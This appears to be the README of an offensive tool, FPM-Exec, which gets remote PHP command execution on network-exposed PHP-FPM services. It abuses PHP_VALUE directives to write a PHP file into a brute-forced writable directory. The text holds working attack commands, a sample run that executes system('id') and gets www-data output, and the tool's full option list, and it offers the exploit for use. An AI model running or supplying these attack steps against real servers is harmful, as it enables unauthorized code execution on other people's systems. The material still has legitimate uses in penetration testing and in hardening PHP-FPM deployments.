# FPM-Exec: FastCGI PHP-FPM Remote Command Execution

A [won't fix RCE exploit](https://github.com/php/php-src/security/advisories/GHSA-xwv2-pr23-qqmh) for any: 
* PHP-FPM service exposed on a network (or stocket) accessible by the attacker.
* with a writable path by php-fpm process

Features:
* IP/Port or unix://path unix sockets support
* Retry mechanism due to PHP process destruction/creation
* Bruteforce of writable directories
* Wordlist creation based on: 
  * OS writable dirs
  * webserver root directories
  * mount dir path
  * / for chrooted env
  * classic upload directories path
  * PHP sessionâ€™s path

## Quick start

Example of successfull execution:
```
# python3 fpm-exec.py -t 127.0.0.1:9000 -c "system('id')"
[+] Checking connectivity with 127.0.0.1:9000 with an empty test request
[+] Connexion OK
[+] Response:
Status: 404 Not Found
X-Powered-By: PHP/8.3.2
Content-type: text/html; charset=UTF-8

File not found.

[+] Loaded 1638 writable directories combinations
[+] Using exec technique 'save_handler'
[+] Searching for a writable dir with dummy cmd 'echo 1'
[+] Trying directory /tmp/
[+] !! Got PHP command exec with a test command: echo 1
[+] Tips: for quicker exec next time use option: -d /tmp/
[+] Executing: system('id')
[+] Execution success:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Explainations

As explained by PHP's maintainers, exposing PHP-FPM service on an untrusted network is considered as a missconfiguration (not a vulnerability) and should never happened.

It is well-known that an exposed PHP-FPM may lead to RCE. PHP-FPM is exposed by default on port tcp/9000 and is for now identified as `cslistener` by nmap.

However, to achieve RCE, there is a pre-requisite: the attacker must know an existing PHP file path on the filesystem: example: `/var/www/html/index.php`.

I discovered that php.ini directives through `PHP_ADMIN_VALUE` or `PHP_VALUE` could be abused to create an arbitrary PHP file on a writable directory without preliminar knownledge on the target system. With this trick, we remove the prerequisite to know a PHP file path.

This exploit could fail is if the script cannot find a well-known writable directory to create a PHP file.

## Other usages

Set or force a writable directory:
```
# python3 fpm-exec.py -t "192.168.1.2:9000" -c "echo shell_exec('id')" -d "/usr/var/tmp"
```

Enable verbose mode:
```
# python3 fpm-exec.py -t "192.168.1.2:9000" -c "echo shell_exec('id')" -v
```

Usage:
```
# python3 fpm-exec.py -h

usage: fpm-exec.py [-h] -t TARGET [-c CMD] [-d DIRECTORY] [-r RETRY] [-e {save_handler,extension}] [-m TIMEOUT] [-v] [-n]

Execute arbitrary PHP command on exposed php-fpm host

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target to call, host:port or unix://path
  -c CMD, --cmd CMD     PHP command to execute
  -d DIRECTORY, --directory DIRECTORY
                        Writable directory list comma separated
  -r RETRY, --retry RETRY
                        Retry request count
  -e {save_handler,extension}, --exec-technique {save_handler,extension}
                        Execution technique
  -m TIMEOUT, --timeout TIMEOUT
                        Socket timeout in ms
  -v, --verbose         Verbose output
  -n, --no-color        No colored output
```
